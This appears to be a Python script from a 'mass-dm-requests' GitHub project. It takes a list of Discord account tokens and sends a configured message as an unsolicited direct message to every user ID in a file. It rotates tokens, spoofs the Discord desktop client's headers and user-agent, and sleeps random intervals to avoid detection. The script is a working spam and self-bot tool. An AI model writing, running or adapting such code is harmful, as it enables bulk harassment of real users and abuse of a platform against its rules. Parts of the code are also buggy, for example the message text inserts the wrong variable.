import sys
import subprocess
try:
    import json
    import time
    import asyncio
    import random
    from datetime import datetime
    from colorama import Fore
    import math
    from rich.console import Console
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", '-r', 'requirements.txt'])

with open("tokens.json", "r") as file:
    tokens = json.load(file)
# initialize the Console() class
console = Console()


class discordConnect:

    def __init__(self, token, client):
        self.token = token
        self.client_id = client
        self.headers = {'accept': "*/*",
            'accept-encoding': "gzip, deflate, br",
            'accept-language': "en-GB",
            'Authorization': token,
            'Content-Type': "application/json",
            'origin': "https://discord.com",
            'sec-ch-ua-platform': "Mac OS X",
            'user-agent': "Mozilla / 5.0(Macintosh; Intel Mac OS X 10_11_6) AppleWebKit / 537.36(KHTML, like Gecko) discord / 0.0.264 Chrome / 91.0.4472.164 Electron / 13.4.0 Safari / 537.36"}

    def _get_channel_id(self, client_id):
        """ create message and return tokens list of messages """
        res = requests.post('https://discordapp.com/api/v9/users/@me/channels',
                            headers=self.headers, json={'recipient_id': self.client_id})
        return res.json().get('id')

    def execute(self, message):
        """ send message to client """
        channel_id = self._get_channel_id(self.client_id)
        return requests.post(f'https://discordapp.com/api/v9/channels/{channel_id}/messages', headers=self.headers,
                             json={'content': message.replace('user_id', f'{id}').replace('user_mention', f'<@{id}>')})


def websocketMessage(id, token):
    client_id = id

    sendComp = discordConnect(token, client_id)


    sendComp.execute(message)



def log_id(id, token, index, current_time, data, message, display_sleep, duplicate, cooldown, cooldown_max):
    with open("alreadyusedids.json", "r") as file:
        penis = json.load(file)
    with open("blacklistedids.json", "r") as file:
        blcklstdata = json.load(file)
    try:
        if id in blcklstdata:
            print(
                f"{Fore.BLUE}{current_time} {Fore.BLACK}[x] Blacklisted User {Fore.YELLOW}{id} {Fore.BLACK}{index} / {len(data)}")
        elif id not in blcklstdata:
            if duplicate == "True":
                websocketMessage(id, token)
                print(
                    f"{Fore.BLUE}{current_time} {Fore.LIGHTGREEN_EX}[+] Sent {message} to {Fore.YELLOW}{id}{Fore.LIGHTGREEN_EX} {index} / {len(data)}")
                sleep = random.randint(cooldown, cooldown_max)
                if display_sleep == "True":
                    print(f"Sleeping {sleep} seconds")
                if id not in penis:
                    time.sleep(0.01)
                    penis.append(id)

                    with open("alreadyusedids.json", "w") as file:
                        time.sleep(0.01)
                        json.dump(penis, file)
                time.sleep(sleep)
            elif duplicate == "False":
                if id in penis:
                    print(
                        f"{Fore.BLUE}{current_time} {Fore.LIGHTMAGENTA_EX}[x] Avoiding Duplicates: {Fore.YELLOW}{id} {Fore.BLACK}{index} / {len(data)}")
                elif id not in penis:
                    websocketMessage(id, token)
                    print(
                        f"{Fore.BLUE}{current_time} {Fore.LIGHTGREEN_EX}[+] Sent {message} to {Fore.YELLOW}{id}{Fore.LIGHTGREEN_EX} {index} / {len(data)}")
                    sleep = random.randint(cooldown, cooldown_max)
                    if display_sleep == "True":
                        print(f"Sleeping {sleep} seconds")
                    if id not in penis:
                        time.sleep(0.01)
                        penis.append(id)

                        with open("alreadyusedids.json", "w") as file:
                            time.sleep(0.01)
                            json.dump(penis, file)
                    time.sleep(sleep)
    except Exception as e:
        print(f"{Fore.BLUE}{current_time} {Fore.RED}[-]ERROR - {e} {index} / {len(data)}")



with open("ids.json", "r") as file:
    data = json.load(file)
index = 0
for i in data:
    now = datetime.now()
    current_time = now.strftime("%H:%M")
    index += 1
    token = random.choice(tokens)
    id = i
    with open('config.json') as f:
        hoemotion = json.load(f)
    cooldown = hoemotion['min_cooldown']
    cooldown_max = hoemotion['max_cooldown']
    message = hoemotion['message']
    display_sleep = hoemotion['display_sleep']
    duplicate = hoemotion['dm_already_dmed_users']
    log_id(id, token, index, current_time, data, message, display_sleep, duplicate, cooldown, cooldown_max)
input(f"{Fore.LIGHTGREEN_EX}Press Enter 5 times to close the program.")
[input(i) for i in range(4, 0, -1)]
print("Goodbye!\nhttps://github.com/hoemotion/mass-dm-requests Don\'t forget to leave a star!!")
sys.exit()
